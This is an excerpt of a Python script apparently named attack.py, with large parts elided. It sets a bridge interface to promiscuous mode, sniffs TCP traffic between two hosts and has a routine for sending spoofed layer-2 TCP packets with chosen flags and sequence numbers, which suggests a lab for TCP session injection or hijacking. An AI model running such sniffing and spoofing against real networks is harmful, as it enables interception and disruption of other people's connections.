...
# Bridge interface in promiscuous mode
INTERFACE = "br-724421db7572"
...
def enable_promiscuous_mode(iface):
    """Turn on promiscuous mode so we see all traffic on the bridge."""
    subprocess.run(["ip", "link", "set", iface, "promisc", "on"], check=True)
    print(f"[+] {iface} set to promiscuous mode")
...
def send_layer2_packet(src_ip, src_port, dst_ip, dst_port, flags, seq, ack):
    if src_ip not in ip_to_mac or dst_ip not in ip_to_mac:
        print(f"Cannot send packet: Missing MAC for {src_ip} or {dst_ip}")
        return
    ...
    if pkt.haslayer(IP) and pkt.haslayer(TCP):
        ...
        if {ip.src, ip.dst} == {SRC, DST}:
            ...
            if flags_set == {"SYN"}:
                ...
                print(f"Ignored unknown TCP flags: {flags_str}")

if __name__ == "__main__":
    if os.geteuid() != 0:
        print("Run as root: sudo python3 attack.py")
        exit(1)

    enable_promiscuous_mode(INTERFACE)
    print(f"Monitoring TCP packets between {SRC} and {DST} on {INTERFACE} in promiscuous mode...")
    sniff(
        iface=INTERFACE,
